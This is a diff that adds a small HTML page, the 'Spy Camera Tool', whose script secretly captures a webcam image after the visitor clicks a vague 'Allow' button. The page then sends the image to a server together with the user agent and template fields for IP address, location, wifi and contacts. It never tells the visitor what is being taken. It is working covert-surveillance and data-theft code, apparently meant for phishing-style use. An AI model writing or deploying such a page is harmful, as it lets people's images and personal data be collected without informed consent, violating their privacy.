@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spy Camera Tool</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        #status { margin-top: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>Spy Camera Tool</h1>
+    <p>Click "Allow" to grant permissions.</p>
+    <button onclick="startSpy()">Allow</button>
+    <button onclick="denySpy()">Deny</button>
+    <div id="status"></div>
+
+    <script>
+        function startSpy() {
+            document.getElementById('status').textContent = "Requesting permissions...";
+
+            // Get camera access
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    document.getElementById('status').textContent = "Permissions granted!";
+
+                    // Capture image
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Send data to server
+                        fetch('/capture', {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                image: canvas.toDataURL('image/jpeg'),
+                                userAgent: navigator.userAgent,
+                                ip: '{{ ip }}',
+                                location: '{{ location }}',
+                                wifi: '{{ wifi }}',
+                                contacts: '{{ contacts }}'
+                            }),
+                            headers: { 'Content-Type': 'application/json' }
+                        }).then(() => {
+                            document.getElementById('status').textContent = "Data captured!";
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    }, 2000);
+                })
+                .catch(err => {
+                    document.getElementById('status').textContent = "Error: " + err.message;
+                });
+        }
+
+        function denySpy() {
+            document.getElementById('status').textContent = "Permissions denied.";
+        }
+    </script>
+</body>
+</html>
